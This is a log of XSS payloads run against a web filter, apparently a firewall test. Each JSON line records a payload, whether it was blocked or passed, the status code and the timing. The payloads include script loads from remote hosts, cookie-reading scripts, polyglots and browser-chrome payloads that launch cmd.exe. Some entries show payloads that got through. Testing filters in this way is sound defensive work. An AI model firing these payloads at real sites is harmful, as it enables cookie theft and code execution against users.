+{"payload": "<BGSOUND SRC=\"javascript:alert('XSS');\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.008484367994242348}
+{"payload": "<BR SIZE=\"&{alert('XSS')}\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0066310100082773715}
+{"payload": "<LAYER SRC=\"http://xss.rocks/scriptlet.html\"></LAYER>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.008241061004810035}
+{"payload": "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0064543959888396785}
+{"payload": "<LINK REL=\"stylesheet\" HREF=\"http://xss.rocks/xss.css\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005355455999961123}
+{"payload": "<STYLE>@import'http://xss.rocks/xss.css';</STYLE>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006993581002461724}
+{"payload": "<META HTTP-EQUIV=\"Link\" Content=\"<http://xss.rocks/xss.css>; REL=stylesheet\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006323604000499472}
+{"payload": "<STYLE>BODY{-moz-binding:url(\"http://xss.rocks/xssmoz.xml", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.007316168004763313}
+{"payload": "<IMG SRC='vbscript:msgbox(\"XSS\")'>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005707037998945452}
+{"payload": "<IMG SRC=\"mocha:[code]\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.007489793992135674}
+{"payload": "<IMG SRC=\"livescript:[code]\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.008033688995055854}
+{"payload": "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006969587004277855}
+{"payload": "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.008904447997338139}
+{"payload": "<META HTTP-EQUIV=\"Link\" Content=\"<javascript:alert('XSS')>; REL=stylesheet\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006134626004495658}
+{"payload": "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005985662995954044}
+{"payload": "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005508277012268081}
+{"payload": "<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004491779996897094}
+{"payload": "<TABLE BACKGROUND=\"javascript:alert('XSS')\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004655699012801051}
+{"payload": "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.008116088007227518}
+{"payload": "<DIV STYLE=\"background-image: url(&", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.007983361996593885}
+{"payload": "<DIV STYLE=\"width: expression(alert('XSS'));\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.007096933011780493}
+{"payload": "<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.007695021995459683}
+{"payload": "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00636299500183668}
+{"payload": "<XSS STYLE=\"xss:expression(alert('XSS'))\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.007928399994852953}
+{"payload": "exp/*<XSS STYLE='no\\xss:noxss(\"*//*\");", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005243509003776126}
+{"payload": "<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005265380998025648}
+{"payload": "<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.012043294991599396}
+{"payload": "<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.008346085000084713}
+{"payload": "<BASE HREF=\"javascript:alert('XSS');//\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005430913006421179}
+{"payload": "<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://xss.rocks/scriptlet.html\"></OBJECT>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.008782791992416605}
+{"payload": "<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.009777551007573493}
+{"payload": "getURL(\"javascript:alert('XSS')\")", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006424660008633509}
+{"payload": "a=\"get\";", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0047721729933982715}
+{"payload": "<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC=\"javas<![CDATA[cript:alert('XSS');\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004547739998088218}
+{"payload": "<XML SRC=\"http:/xss.rocks/xsstest.xml\" ID=I></XML>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005376254994189367}
+{"payload": "<HTML><BODY>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006797321999329142}
+{"payload": "<SCRIPT SRC=\"http://xss.rocks/xss.jpg\"></SCRIPT>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.009130956997978501}
+{"payload": "<!--", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.008088335001957603}
+{"payload": "<? echo('<SCR)';", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005817331999423914}
+{"payload": "<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.007668671009014361}
+{"payload": "<HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006919028994161636}
+{"payload": "<SCRIPT a=\">\" SRC=\"http://xss.rocks/xss.js\"></SCRIPT>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00618712799041532}
+{"payload": "<SCRIPT a=\">\" '' SRC=\"http://xss.rocks/xss.js\"></SCRIPT>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00944443499611225}
+{"payload": "<SCRIPT \"a='>'\" SRC=\"http://xss.rocks/xss.js\"></SCRIPT>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.013622509010019712}
+{"payload": "<SCRIPT a=`>` SRC=\"http://xss.rocks/xss.js\"></SCRIPT>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.01931660900299903}
+{"payload": "<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"xss.rocks/xss.js\"></SCRIPT>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00924030999885872}
+{"payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005811408002045937}
+{"payload": "/*-/*`/*\\`/*'/*\"/**/", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00622535400907509}
+{"payload": "(/* */oNcliCk=alert() )", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00592808700457681}
+{"payload": "//%0D%0A%0D%0A//", "attack_type": "XSS", "result": "passed", "status_code": 200, "elapsed": 0.016697379003744572}
+{"payload": "</stYle/</titLe/</teXtarEa/</scRipt/--!>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00558206599089317}
+{"payload": "\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004688450993853621}
+{"payload": "<input type='text' value='jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e'></input>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005162982997717336}
+{"payload": "<input type=text value=jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e></input>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005547202003072016}
+{"payload": "<img border=3 alt=jaVasCript:/*-/*`/*\\`/*&", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004073775009601377}
+{"payload": "<a href=\"jaVasCript:/*-/*`/*\\`/*&", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004088840010808781}
+{"payload": "<math xlink:href=\"jaVasCript:/*-/*`/*\\`/*&", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00518327098689042}
+{"payload": "<iframe src=\"jaVasCript:/*-/*`/*\\`/*&", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004510762999416329}
+{"payload": "<!--jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e-->", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004472988992347382}
+{"payload": "<style>jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e</style>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005314976995578036}
+{"payload": "<textarea>jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e</textarea>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005919239003560506}
+{"payload": "<div>jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e</div>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004450370004633442}
+{"payload": "var str = \"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\";", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004997973010176793}
+{"payload": "var str = 'jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e';", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.007871784007875249}
+{"payload": "<script>//jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0044243909942451864}
+{"payload": "<script>/*jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e*/</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006193398992763832}
+{"payload": "</script><script src=\"https://static.jsbin.com/js/render/edit.js?3.35.11\"></script><script>jsbinShowEdit && jsbinShowEdit({\"static\":\"https://static.jsbin.com\",\"root\":\"https://jsbin.com\"});</script><script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005098547000670806}
+{"payload": "setTimeout(location.search.slice(1));", "attack_type": "XSS", "result": "passed", "status_code": 200, "elapsed": 0.015407399987452663}
+{"payload": "jaVasCript:/-/%60/%5C%60/'/%22//(/%20*/oNcliCk=alert()%20)//%250D%250A%250D%250A//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%3CsVg/%3CsVg/oNloAd=alert()//%3E%3E", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005415236999397166}
+{"payload": "var data = \"jaVasCript:/*-/*`/*\\`/*&", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003629042999818921}
+{"payload": "aim: &c:\\windows\\system32\\calc.exe\" ini=\"C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\pwnd.bat\"", "attack_type": "XSS", "result": "passed", "status_code": 200, "elapsed": 0.015737488007289357}
+{"payload": "firefoxurl:test|\"%20-new-window%20javascript:alert(\\'Cross%2520Browser%2520Scripting!\\');\"", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.008445318002486601}
+{"payload": "navigatorurl:test\" -chrome \"javascript:C=Components.classes;I=Components.interfaces;file=C[\\'@mozilla.org/file/local;1\\'].createInstance(I.nsILocalFile);file.initWithPath(\\'C:\\'+String.fromCharCode(92)+String.fromCharCode(92)+\\'Windows\\'+String.fromCharCode(92)+String.fromCharCode(92)+\\'System32\\'+String.fromCharCode(92)+String.fromCharCode(92)+\\'cmd.exe\\');process=C[\\'@mozilla.org/process/util;1\\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006092273004469462}
+{"payload": "res://c:\\\\program%20files\\\\adobe\\\\acrobat%207.0\\\\acrobat\\\\acrobat.dll/", "attack_type": "XSS", "result": "passed", "status_code": 200, "elapsed": 0.018003884004428983}
+{"payload": "firefoxurl:test\" -chrome \"javascript:C=Components.classes;I=Components.interfaces;file=C['@mozilla.org/file/local;1'].createInstance(.nsILocalFile);file.initWithPath('C:'+String.fromCharCode(92)+String.fromCharCode(92)+'Windows'+String.fromCharCode(92)+String.fromCharCode(92)+'System32'+String.fromCharCode(92)+String.fromCharCode(92)+'cmd.exe');process=C['@mozilla.org/process/util;1'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.009857867000391707}
+{"payload": "navigatorurl:test\" -chrome \"javascript:C=Components.classes;I=Components.interfaces;file=C['@mozilla.org/file/local;1'].createInstance(I.nsILocalFile);file.initWithPath('C:'+String.fromCharCode(92)+String.fromCharCode(92)+'Windows'+String.fromCharCode(92)+String.fromCharCode(92)+'System32'+String.fromCharCode(92)+String.fromCharCode(92)+'cmd.exe');process=C['@mozilla.org/process/util;1'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00650676699297037}
+{"payload": "'", "attack_type": "XSS", "result": "reflected", "status_code": 200, "elapsed": 0.018659214998479}
+{"payload": "<font style='color:expression(alert('XSS'))'>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006369440990965813}
+{"payload": "' onmouseover=alert(/Black.Spook/)", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006795318011427298}
+{"payload": "' or 2=2", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005122362999827601}
+{"payload": "\"", "attack_type": "XSS", "result": "reflected", "status_code": 200, "elapsed": 0.018262847006553784}
+{"payload": "\" or 202", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006279968001763336}
+{"payload": "\";eval(unescape(location))//", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005251915004919283}
+{"payload": "\"><BODY onload!", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004349939990788698}
+{"payload": "\"><iframe%20src=\"http://google.com\"%%203E", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003980289999162778}
+{"payload": "\"><img src=x onerror=prompt(1);>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004515064996667206}
+{"payload": "\"><img src=x onerror=window.open('https://www.google.com/');>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0064912079978967085}
+{"payload": "'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004976489988621324}
+{"payload": "%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.007046369995805435}
+{"payload": "%3Cscript%3Exhr=new%20ActiveXObject%28%22Msxml2.XMLHTTP%22%29;xhr.open%28%22GET%22,%22/xssme2%22,true%29;xhr.onreadystatechange=function%28%29{if%28xhr.readyState==4%26%26xhr.status==200%29{alert%28xhr.responseText.match%28/%27%28[^%27]%2b%29/%29[1]%29}};xhr.send%28%29;%3C/script%3E", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.014250395994167775}
+{"payload": "&", "attack_type": "XSS", "result": "passed", "status_code": 200, "elapsed": 0.01863467499788385}
+{"payload": "&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0063222199969459325}
+{"payload": "&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi", "attack_type": "XSS", "result": "passed", "status_code": 200, "elapsed": 0.016924491006648168}
+{"payload": "&amp;", "attack_type": "XSS", "result": "passed", "status_code": 200, "elapsed": 0.01976313500199467}
+{"payload": "&lt;IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004877048006164841}
+{"payload": "&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005193561999476515}
+{"payload": "&lt;IMG SRC=&amp;", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0050571969914017245}
+{"payload": "&lt;SCRIPT SRC=//xss.rocks/.j>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004890393000096083}
+{"payload": "'); alert('XSS", "attack_type": "XSS", "result": "passed", "status_code": 200, "elapsed": 0.012721329010673799}
+{"payload": "<%<!--'%><script>alert(1);</script -->", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005764720001025125}
+{"payload": "<%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64%69%76%22); %64%2e%61%70%70%65%6e%64%43%68%69%6c%64(%64%6f%63%75%6d%65%6e%74%2e%68%65%61%64%2e%63%6c%6f%6e%65%4e%6f%64%65(%74%72%75%65)); %61%6c%65%72%74(%64%2e%69%6e%6e%65%72%48%54%4d%4c%2e%6d%61%74%63%68(%22%63%6f%6f%6b%69%65 = '(%2e%2a%3f)'%22)[%31]); </%73%63%72%69%70%74>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006074917007936165}
+{"payload": "<--`<img/src=` onerror=alert(1)> --!>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006151808003778569}
+{"payload": "<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005339194001862779}
+{"payload": "<<scr\\0ipt/src=http://xss.com/xss.js></script", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005574670998612419}
+{"payload": "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005208911999943666}
+{"payload": "<a  href=\"data:text/html;blabla,&", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00428850699972827}
+{"payload": "<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&", "attack_type": "XSS", "result": "passed", "status_code": 200, "elapsed": 0.013173665007343516}
+{"payload": "<a href=\"data:text/html;base64_,<svg/onload=\\u0061&", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.007119517002138309}
+{"payload": "<a href=\"javascript&colon;\\u0061&", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0049293699994450435}
+{"payload": "<a href=\"jAvAsCrIpT&colon;alert&lpar;1&rpar;\">X</a>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.022535823998623528}
+{"payload": "<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0050097939965780824}
+{"payload": "<a onmouseover=\"alert(document.cookie)\">xxs link</a>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006234639993635938}
+{"payload": "<a onmouseover=alert(document.cookie)>xxs link</a>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005512197996722534}
+{"payload": "<a target=\"x\" href=\"xssme?xss=%3Cscript%3EaddEventListener%28%22DOMFrameContentLoaded%22,%20function%28e%29%20{e.stopPropagation%28%29;},%20true%29;%3C/script%3E%3Ciframe%20src=%22data:text/html,%253cscript%253eObject.defineProperty%28top,%20%27MyEvent%27,%20{value:%20Object,%20configurable:%20true}%29;function%20y%28%29%20{alert%28top.Safe.get%28%29%29;};event%20=%20new%20Object%28%29;event.type%20=%20%27click%27;event.isTrusted%20=%20true;y%28event%29;%253c/script%253e%22%3E%3C/iframe%3E", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00864178899792023}
+{"payload": "<a target=\"x\" href=\"xssme?xss=<script>find('cookie'); var doc = getSelection().getRangeAt(0).startContainer.ownerDocument; console.log(doc); var xpe = new XPathEvaluator(); var nsResolver = xpe.createNSResolver(doc); var result = xpe.evaluate('//script/text()', doc, nsResolver, 0, null); alert(result.iterateNext().data.match(/cookie = '(.*?)'/)[1])</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.008658420003484935}
+{"payload": "<a target=\"x\" href=\"xssme?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=%22javascript:parent.x(window);%22></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0069971679913578555}
+{"payload": "<a target=\"x\" href=\"xssme?xss=<script>var cl=Components;var fcc=String.fromCharCode;doc=cl.lookupMethod(top, fcc(100,111,99,117,109,101,110,116) )( );cl.lookupMethod(doc,fcc(119,114,105,116,101))(doc.location.hash)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006851848011137918}
+{"payload": "<BODY onload!", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005207437003264204}
+{"payload": "<body onLoad=\"alert('XSS');\"", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004767677004565485}
+{"payload": "<body onunload=\"javascript:alert('XSS');\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005297762996633537}
+{"payload": "<body/onload=&lt;!--&gt;&", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.008983709994936362}
+{"payload": "<div  style=\"position:absolute;top:0;left:0;width:100%;height:100%\"  onmouseover=\"prompt(1)\" onclick=\"alert(1)\">x</button>?", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.008530652994522825}
+{"payload": "<div onmouseover='alert&lpar;1&rpar;'>DIV</div>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.007361434996710159}
+{"payload": "<div/onmouseover='alert(1)'> style=\"x:\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006686277003609575}
+{"payload": "<embed code=\"http://businessinfo.co.uk/labs/xss/xss.swf\" allowscriptaccess=always>?", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005524943000636995}
+{"payload": "<embed src=\"http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf\"> ?", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006696666998323053}
+{"payload": "<form><button formaction=javascript&colon;alert(1)>CLICKME", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005034444009652361}
+{"payload": "<FRAMESET><FRAME SRC=\\\"javascript:alert('XSS');\\\"></FRAMESET>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005316089998814277}
+{"payload": "<iframe  src=\"data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E\"></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005185294998227619}
+{"payload": "<iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ?", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006266574011533521}
+{"payload": "<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004698324992205016}
+{"payload": "<iframe id=%22ifra%22 src=%22/%22></iframe> <script>ifr = document.getElementById('ifra'); ifr.contentDocument.write(%22<scr%22 %2b %22ipt>top.foo = Object.defineProperty</scr%22 %2b %22ipt>%22); foo(window, 'Safe', {value:{}}); foo(Safe, 'get', {value:function() {    return document.cookie }}); alert(Safe.get());</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006978778008488007}
